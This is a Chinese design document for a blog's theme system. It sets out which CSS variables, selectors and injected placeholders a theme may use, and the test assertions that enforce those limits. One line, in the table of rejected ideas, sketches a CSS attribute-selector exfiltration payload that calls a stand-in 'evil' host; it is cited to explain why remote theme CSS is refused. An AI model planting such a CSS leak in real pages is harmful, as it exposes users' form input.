# 主题契约

这份文档只回答一个问题：**换一套主题，允许改到哪儿。**

这条线划错，代价不是「样式不对」——是把渲染器、权限判定、响应头一起拖进主题里，
换皮变成改站。下面每一条都对应 `scripts/test-theme-contract.mjs` 里的断言，
不是设计意图，是能跑红的规则。

---

## 一、一进一出

```
public/*.html（骨架 + 占位符）
        │
        │  Worker injectTheme()：读 settings.theme / settings.mode
        ▼
   注入三样东西，然后原样返回
        ├─ <!--THEME-->       → window.__THEME_DEFAULT__ + <link id="tcss-default"> + 图标
        ├─ <!--THEMEBOOT-->   → 资源清单 __ASSET_H__ + 防闪引导脚本
        └─ data-theme / data-mode  在字节流里就是终值（不靠 JS 填）
        │
        ▼
public/style.css          变量层（:root）+ 结构层（用变量，不定义变量）
public/theme/<id>.css     只覆盖变量；edge 另有 4 条部件覆盖
```

契约管两件事：

| 方向 | 内容 | 落点 |
|---|---|---|
| **进** | Worker 往 HTML 里注入什么 | `<!--THEME-->` / `<!--THEMEBOOT-->` 两个占位符，`src/index.js` 的 `injectTheme()` |
| **出** | CSS 暴露哪些变量名 | `src/theme-contract.js` 的 `CONTRACT_CORE` + `CONTRACT_OPTIONAL`，共 23 个 |

契约明确**不管**三件事：

1. **渲染器** `public/md.js` —— 抠码 → 转义 → 拼装的顺序。主题碰它，代码块就会随主题变行为。
2. **权限与审核** —— `liveSql()`、`review_status`、`ownerOrAdmin()`。导航里的登录格由 Worker 直出，主题不许判断「当前是不是管理员」。
3. **响应头与 CSP** —— 主题不许靠内联 `<style>` 绕过 nonce。`style-src` 里的 `'unsafe-inline'` 是给 Markdown 的 style 属性开的，不是给主题开的后门。

---

## 二、变量契约（23 个槽位）

定义只有一份：`src/theme-contract.js`。加槽位要改那里，不能直接在主题文件里写新变量名。

### 必填 9 个（`CONTRACT_CORE`）

| 变量 | 用途 |
|---|---|
| `--bg` / `--bg-soft` | 页面底色 / 次级面 |
| `--card` / `--line` | 卡片面 / 发丝线（分区靠它，不靠阴影） |
| `--fg` / `--fg-soft` / `--muted` | 正文 / 次要 / 辅助 |
| `--accent` / `--accent-soft` | 强调（链接、选中）/ 强调的浅底 |

缺一个不报错，会**静默继承上一套**——最难查的那种。[TC-27] 逐套验浅色块齐全。

### 可选 14 个（`CONTRACT_OPTIONAL`）

`--green` `--red` · `--radius` `--shadow` · `--tok-k` `--tok-s` `--tok-n` `--tok-f`（语法高亮）·
`--hero-space` · `--mono` `--sans` `--serif` · `--brand` `--on-brand`

给了就用，不给就继承主表。字体与语法高亮属于「主题可以有自己的口味」。

> **`--hero-weight` 已删（2026-11-24）**：曾在主表定义 `600` / 深色 `700`，但 `.page-head h1` 只吃了
> `letter-spacing: var(--hero-space)`，**没有任何规则读过它**，八套主题也一个都没定义。它一度是契约
> 第 24 个槽位，占着文档一行、替一个不存在的设计意图留位。删掉而不是接上 `font-weight`，是因为
> 接上会改标题字重（现有继承值不是 600），那是视觉变更，不归「清理死槽位」这轮做。
> `[TC-39]` 的第二条就是为这个类别加的：**契约槽位必须至少被一处样式消费**。

`--brand` 与 `--on-brand` 目前只有 `edge` 用：锚橙 `#f6821f` 在纯白上 **2.58:1**，
当 `--accent`（文字色）过不了 AA，所以它只做填充，另给压深的 `#c2410c` 做文字，
橙底上的字走 `--on-brand`。[TC-22] 把 8 套 × 2 态 × 5 项（正文/次要/辅助/强调对底色、正文对卡片）+ `--on-brand` 对 `--brand`，共 82 组实算一遍。

---

## 三、四条硬规则

### 规则 1：主题文件只许两个选择器前缀

```css
:root[data-theme="ink"]                /* 变量块 */
:root[data-theme="ink"] .btn.primary   /* 部件覆盖，可选 */
```

其它一律不许。[TC-02] 逐条验。`.t-ink` 那种 body 类名作用域**不采用**——
`:root[data-theme]` 已经在 `<html>` 上了，再挂一个 body 类等于两套作用域、
两处要同步，且 `data-mode` 的级联会断。

### 规则 2：变量块只许变量声明，部件块只许引用变量

- 光杆 `:root[data-theme="x"]` 块：只许 `--var: …` 与 `color-scheme`。
  写成 `background: red !important` 就是直接改 html 底色，那是改站。
- 带后代的部件块：可以改属性，但色值必须经 `var()` / `color-mix()` 表达。
  写死 `#d9721a` 这种「橙的加深版」，换 `--brand` 时它不会跟着变，等于在主题里
  又埋了一份配色。混黑 `#000` / 混白 `#fff` 当加深提亮的算子，放行。

[TC-25] 分两级验。

### 规则 3：契约变量的定义只许出现在 `:root` 块

`style.css` 是变量层 + 结构层一个文件（拆开多一个 RTT，见 P-051 的取舍）。
层次靠断言表达：`--bg` `--accent` 这些只许在 `:root` 里定义，组件块里只许用。
组件自己的局部变量（`--ava` 这种评论头像哈希色）不在清单里，不受管。[TC-26]。

> **没做**：物理拆成 `contract.css` + `structure.css`。拆了之后两边照样能互相引用
> 变量，约束力反而更弱，还多一个请求。分层是纪律问题，不是文件问题。

### 规则 4：私有 token 必须用 `--_` 前缀，且不许跨文件

代码块想给 8 类语法角色配色（注释 / 关键字 / 字符串 / 函数 / 类型 / 标签 / 数字 / 变量），
契约只有 4 个 `--tok-*` 槽位。剩下的塞进契约，等于逼八套主题各给 8 个值 —— 那不叫可选。
所以留一个口子：`--_xxx` 是主题自己的私有变量。

代价必须用两条护栏换，缺一条就退化成「结构层开后门」：

| 护栏 | 为什么 | 谁守 |
|---|---|---|
| 定义与引用只在同一个主题文件里 | 主表出现 `var(--_x)` 就是全站依赖某套主题的私有值，换主题整块塌 | TC-24 的 `dangling` / `leaked` |
| 主表不许定义 `--_x` | 结构层持有私有 token，等于留了个把手 | TC-24 的 `leaked` |

前缀常量只有一份：`src/theme-contract.js` 的 `INTERNAL_PREFIX`，测试从这里 import。
两类 `--_` 的处理不同：变量块里放行其声明（值可以是死色值），部件块里仍守规则 2。

---

## 四、结构层 DOM 事实（写主题 CSS 之前先看这张表）

主题文件只能改样式，**命中不了元素就是死代码，而且不报错、HTTP 200**。2026-11-24 一天之内
收到三份按「常见博客长什么样」猜类名的主题材料，猜错的部分全是静默失效。以渲染器为准：

| 元素 | 真实结构 | 被猜成过 |
|---|---|---|
| 文章容器 | `<div class="md post-body">`（`index.js:1253`） | `.prose` |
| 摘要 | `<aside class="post-lead"><span class="lead-tag">AI 摘要</span><p>…</p></aside>` | `.ai-summary`、`[data-ai-summary]` |
| 代码块 | `<div class="code-wrap" data-lang data-lines><div class="code-head">…</div><pre class="code-block"><span class="gutter">…</span><code class="language-x">…</code></pre></div>` | 以为容器叫 `.code-block` |
| 行内代码 | `.md code` | — |
| 评论条目 | `.cmt` | `.comment` |
| 友链卡片 | `.friend-card` | `.friend-item` |
| 文章卡片 | `.post-card` | `.card` |
| 语法高亮 | `.tok-k` `.tok-s` `.tok-c` `.tok-n` `.tok-f`（没有 Prism，不存在 `.token.*`） | `.token.keyword` 一大套 |

两条硬结论：

- **容器是 `.code-wrap`，`.code-block` 是 `<pre>` 自己的 class**。想在代码块左侧画强调竖条，
  落点是 `.code-wrap`；画在 `.code-block` 上会被容器的 `overflow: hidden` + 圆角裁掉，
  长代码块还会被 `.gutter`（行号列，独立背景）从左侧盖住。写「`.pre` 与 `.code-block` 两条兜底」
  是重复命中同一个节点，不是两层。
- **友链三态圆点 `dot-ok` / `dot-warn` / `dot-err` 不存在**。材料里「三态正好用辅色」建立在一个
  没有的元素上 —— 现在友链状态只存在于 `http_status` / `latency_ms` 两个字段，页面上没有圆点。

### 语法高亮：5 类产物，4 个契约槽位

`highlight()` 只产出 5 类钩子，**别的名字一个都没有**：

| 钩子 | 语义 | 颜色来自 |
|---|---|---|
| `.tok-k` | 关键字 | `--tok-k`（契约可选槽位） |
| `.tok-s` | 字符串 | `--tok-s` |
| `.tok-n` | 数字 / 常量 | `--tok-n` |
| `.tok-f` | 函数名 | `--tok-f` |
| `.tok-c` | 注释 | **`--muted`**，不占槽位 |

第 5 类走 `--muted` 是既定取舍：给注释单开一个槽位，等于八套主题各多一个必填值，而注释色本来
就该跟辅助文字同一档。代价是 `--muted` 必须在 `--bg-soft` 上也过 AA —— 这是 [TC-30] 单独存在的原因。

**这个借用必须登记在 `TOK_EXCEPTION`（`src/theme-contract.js`），不能靠「结构层就近找个变量」**。
两者的区别在于：就近找是隐式的，挑对了没人记得、挑错了没人发现；登记是显式的，新增第 6 类时
要么加 `--tok-x` 槽位，要么在表里写一行 —— 那一行本身就是一次 review。

主题文件里**写 `builtin` / `type` / `tag` / `variable` 这四类没有任何意义**：Primer 表里有，渲染器
不产出，写了就是死规则。反过来，渲染器哪天新增一类而主题没配色，那个 token 会落回继承色 ——
看着能用，实际掉了。

这张表由五条断言守着：

| 断言 | 守什么 |
|---|---|
| [TC-35] | 真渲染一次，验产物里的容器与语法钩子 |
| [TC-36] | 反面：不存在 `.token.*`，且必须**真的**有 `tok-*`（正面锚点） |
| [TC-37] | 产物 token 类别集合 **=** `style.css` 里定义了的类别集合（两个方向都不许有差） |
| [TC-38] | 主题文件里的类名选择器必须在全站类名表里（动态 `className` 赋值也算来源） |
| [TC-41] | 每一类的**颜色来源**：有槽位就用同名槽位、没槽位必须在 `TOK_EXCEPTION`，且 `style.css` 里写的正是那个变量 |

`TC-37` 只看「类别在不在」，`TC-41` 才看「颜色从哪来」。缺了后者，`.tok-c { color: var(--fg-soft) }`
能同时穿过 `TC-37`（类别在）、`P-043`（是契约变量）、`P-046`（不碰主色）三道闸。

grep 模板字符串是不够的 —— 变量拼接与「事后包装」都漏得掉。

### 动态类：39 个名字，36 个要等 JS

类名不都活在 `class="…"` 字面量里。`classList.add('clipped')` 这一类写法产生的名字，全站
**39 个**（`classList` 78 处 / `.className =` 15 处，去重后 39 个名字），它们能分成两层：

| 层 | 数量 | 例子 | 什么时候存在 |
|---|---|---|---|
| SSR 模板里也有 `class="…"` | 3 | `on` / `active` / `warn` | 首屏直出就有，JS 只负责切换 |
| 只在 JS 赋值里出现 | 36 | `back-top` / `read-bar` / `lb*`（灯箱）/ `mtoc*` / `copy-link` | JS 跑完之后才被创建 |

对写主题的含义只有一条：**给第二层写样式是安全的，但别给它预留空间**。这些元素在 SSR 阶段
根本不存在，`min-height` / `padding` 预留出来的空隙会变成真实的布局空档 —— 那是自己造 CLS。
第一层反过来，元素先有、状态后变，样式要能在无 JS 时也站得住（`on` / `active` 的静态外观就是
「未激活」，不是「没样式」）。

**这 36/39 不设阈值断言**（`P-069`）：机器只能测「元素在不在 SSR 里」，测不出「它该不该在」。
整页渲染也拿不到更多 —— `servePostPage` 直出的 HTML 本来就没有 JS 建的元素。要产物级结论，
用无头浏览器关 JS 跑一次 `querySelectorAll`，那是线上体检的事，不该塞进 `npm test`。

---

## 五、加第 9 套要动几处

**两处代码 + 一次构建**：

```bash
# 1. 建文件：只覆盖契约变量
$EDITOR public/theme/foo.css

# 2. 面板加一行文案（中文名与描述没法从文件名推，这份必须手写）
$EDITOR public/theme.js     # THEMES 数组

# 3. 重算资源清单（不是代码改动）
npm run build:sri
```

不需要改：`THEME_IDS`（从清单派生）、`THEME_COLOR`（从 CSS 的 `--bg` 派生）、
`index.html`、`fillSeo()`、`md.js`、CSP、缓存逻辑。

[TC-28] 给派生函数一个多出 `theme/probe9.css` 的假清单，新主题必须出现在结果里；
[TC-07] 要求面板集合与派生清单一致。两条一起才算契约成立。

**忘了跑 `build:sri` 的症状**：后台选新主题提示「未知的风格」（它不在派生清单里）。
比静默回落纸韵好查，且 `npm test` 与 `npm run deploy` 都会先跑 `build:sri`。

---

## 六、明确没做

| 想法 | 为什么不做 |
|---|---|
| **远程主题 CSS**（GitHub Raw 直连） | 破 `integrity` 与内容哈希缓存这对不变量；冷路径多一次 RTT；CSS 本身是外泄通道（`input[value^=…]{background:url(//evil/…)}`，而 `img-src https:` 是放开的）。要做得上域名白名单 + 体积上限 + 剥离 + 边缘缓存一整套。 |
| **`?theme=<id>` 写进 cookie** | 主题偏好在 `localStorage`，SSR 只注入站点默认值。搬到 cookie 意味着每个响应都要 `Vary`，或者带 cookie 的响应一律 `private, no-store` —— 那是**降低**匿名缓存资格（现在匿名访客与爬虫共享 `s-maxage=300`）。首帧也不会更准：引导脚本在 `<head>` 里同步跑，CSS 到手前 `data-theme` 就已经是终值。 |
| **主题级模板覆盖**（换 HTML 结构） | 骨架级差异走变量（`--list-cols`、`--page-max`），不走第二套 DOM。真要做侧栏/无侧栏，是加一个受控的布局变量，不是让主题写 `.t-x .layout { grid-template-columns }` —— 后者等于让主题接管布局。 |
| **把 `anzhiyu` 的 79 条骨架搬进 `theme/anzhiyu.css`** | 省 2.37 KB gzip，只有非默认主题的读者吃得到，而默认主题的读者要多一个请求。净负。默认主题的样式必须跟第一个请求一起到。 |
| **`data-slot` 占位属性** | 主题文件只能碰 `:root[data-theme=x]` 作用域内的样式，天然改不了结构，槽位标记没有可约束的对象。占位符越少，`injectTheme()` 的替换链越短。 |
| **暗色对比度单独跑一套断言** | `[TC-22]` 已经是 8 套 × 2 态，深浅都算了；卡片底与按钮字也一并算。 |

---

## 七、断言的代价与反向验证

新写一条断言，先把它该抓的东西改坏一次，看着它红，再改回来。这批的注入验证：

| 注入 | 变红的断言 |
|---|---|
| `forest.css` 加 `--my-shadow` | TC-24 |
| `ocean.css` 变量块加 `background: red !important` | TC-25 |
| `edge.css` 的 `color-mix(…var(--brand)…)` 改回 `#d9721a` | TC-25 |
| `.post-card` 里加 `--accent: red` | TC-26 |
| `plum.css` 的 `--muted` 改成 `--xx-muted` | TC-22 / 24 / 25 / 27 |
| `edge` 的 `--on-brand` 改成 `#ffffff`（白字搁橙底） | TC-22（报 2.58:1） |
| `THEME_IDS` 改回字面量数组 | TC-07 / TC-23 |
| `deriveThemeIds` 不扫文件 | TC-07 |
| `md.js` 的 `tok-*` 全改 `token x`（Prism 写法） | TC-35（报「语法钩子是 .tok-*」）+ TC-36（报「出现 class=“token”」） |
| `md.js` 的 `<pre class="code-block">` 去掉 class | TC-35（报「`<pre>` 自己带 .code-block」） |
| `md.js` 的 `code-wrap` 全改 `codewrap` | TC-35（报「外层是 .code-wrap」） |
| `srgbToLinear` 阈值 0.03928 → 0.5 | TC-32（报 `#e6edf3 实算 16.15 ≠ 官方 16.02`） |
| `definedVars` 字符类去掉 `_` | TC-34（报「一个都没解析出来」） |
| 主表 `style.css` 加 `var(--_cd-bg)` | TC-24（报「内部 token 泄漏到结构层」） |
| `highlight()` 只增不减地多产出一个 `tok-r` | TC-37（报「渲染器产出了没有样式的 token 类别」） |
| `style.css` 末尾加 `.tok-z { color: #f00 }` | TC-37（报「死规则」） |
| `edge.css` 加 `.code-badge { … }` | TC-38（报「全站没有任何元素产出的类名」） |
| `style.css` 加 `.x-probe { color: var(--tok-r) }`（未定义、无 fallback） | TC-39（报「无处可寻的变量」） |
| `--hero-weight` 加回 `CONTRACT_OPTIONAL` | TC-39（报「槽位没有任何样式引用」） |
| `editor.html` 的 `classList.toggle('saving',…)` 改回 `className = 'save-state ' + kind` | TC-40（报「动态类名是拼出来的」） |
| `classList.add('clipped')` 改成 `` classList.add(`clipped-${1}`) `` | TC-40（同上，并带出原文） |
| `scanDynamicClasses` 的 `classList\.` 手滑成 `classLst\.` | TC-38（报「源码里 18 处 classList，采集器一处都没认出来」） |
| `.tok-c` 的 `var(--muted)` 改成 `var(--fg-soft)`（仍是契约变量） | TC-41（报「表说的是 --muted，`style.css` 里写的是 --fg-soft」） |
| `TOK_EXCEPTION` 清空 / 加一个不产出的 `r` | TC-41（报「既没槽位也没登记」/「登记是空头」） |
| `.md pre.code-block` 的 `background: transparent` 改回 `var(--bg-soft)` | TC-42（报「设了 background」） |
| 打印块里的 `1px solid #d6d6d6` 加粗成 `2px solid #000` | **不红** —— `@media print` 豁免成立 |

TC-27 第一版写的是 `block.includes('--muted:')`，注入 `--xx-muted:` 时**没红** ——
子串匹配被前缀骗过了。改成带边界的正则才抓住。它当时被记成「这批唯一一个假阴性」，
后来同类又出了三次（`--_` 前缀的字符类漏 `_`、`TC-37` 注入成「只产 1 类」而不是「只增不减」、
`TC-42` 第一版锚点绑死某条声明），共同形态见 `P-059`：**凡期望空集的判断，都要配一条
「必须看见」的锚点**。

### 元断言：验断言自己会不会红

人工注入只能证明「我上次改坏时它红过」。文件一改，这条证据就过期了。所以把注入
固化进测试，每次跑都验一遍 —— 纯内存字符串，不碰磁盘，成本为零：

| 断言 | 喂进去 | 要求 |
|---|---|---|
| `[TC-33]` | `--evil-token: 1px`（契约外） | `outsideVars()` 必须返回 `['--evil-token']` |
| `[TC-33]` | `--bg / --line`（契约内） | 不许误报；**且** `definedVars()` 必须看得见这两个 |
| `[TC-34]` | `--_cd-bg / --_cd-d-string` | 放行；**且** 解析器必须看得见（见下） |
| `[TC-34]` | `.t-x pre { var(--brand) }` | `definedVars()` 返回空 —— 用不是定义 |
| `[TC-34]` | 部件块里 `--evil: 1px` | 必须抓到 —— 防「放行 `_` 时顺手放行整块」 |
| `[TC-32]` | Primer 官方四色（16.02 / 7.51 / 12.31 / 6.15） | 先反查 `contrast()` 算法，容差 0.02 |

**`definedVars()` 的字符类必须是 `[a-z0-9_-]`，少了 `_` 就认不出 `--_cd-bg`。**
这个漏洞第一版真实存在，而 TC-34 当时报的是**通过** —— 因为它期望 `[]`，没认出来也是 `[]`。
所以凡「期望空集」的断言都必须配一条「必须看见」的锚点，否则探测逻辑整个坏掉也是绿的。
提这份材料的脚本里 `[...d.public].every(...)` 就是同一个病：空集恒 `true`。

注入验证（全部实跑过）：契约外变量 → TC-24 红；`--_` 前缀 + 本文件引用 → 绿；
主表加 `var(--_x)` → TC-24 报「内部 token 泄漏到结构层」；`srgbToLinear` 阈值改坏 →
TC-32 报 `#e6edf3 实算 16.15 ≠ 官方 16.02`；正则去掉 `_` → TC-34 报「一个都没解析出来」。

### 一条不收的元断言（P-063）

材料提议做「否定断言不得被正向断言遮蔽」，判据是 `firstThrow > lastAssert || countAsserts <= 1`。
实测这行**只等价于「每个测试体最多一条 assert」**：多条时 `firstThrow < lastAssert` 恒成立、
两个分支同时为假 → 红。于是它会误红「两条正面断言」（本仓库 35 个 `t()` 里 25 个如此），
对「只有反面断言」放行 —— 与它要抓的东西不等价，是第四条假绿。

全仓 459 个测试块里 46 个「反面断言不在首位」，逐块拆分要重写 40 个测试体，换来的只是
「失败时能同时看到两个红点」。保留的规矩只有一句：**一条反面断言不得与它否定的那条正面断言
同处一个 `t()`**（`TC-36` 就是这么拆出来的）。判据不是正则，是问「这条红了，我能不能看到那条的结果」。

---

出处：`src/theme-contract.js` · `src/settings.js` · `src/themeboot.js` ·
`src/index.js` 的 `injectTheme()` · `scripts/build-sri.mjs` · `scripts/test-theme-contract.mjs` ·
`PITFALLS.md` 的 P-051 / P-055 · 站务记录 2026-11-24
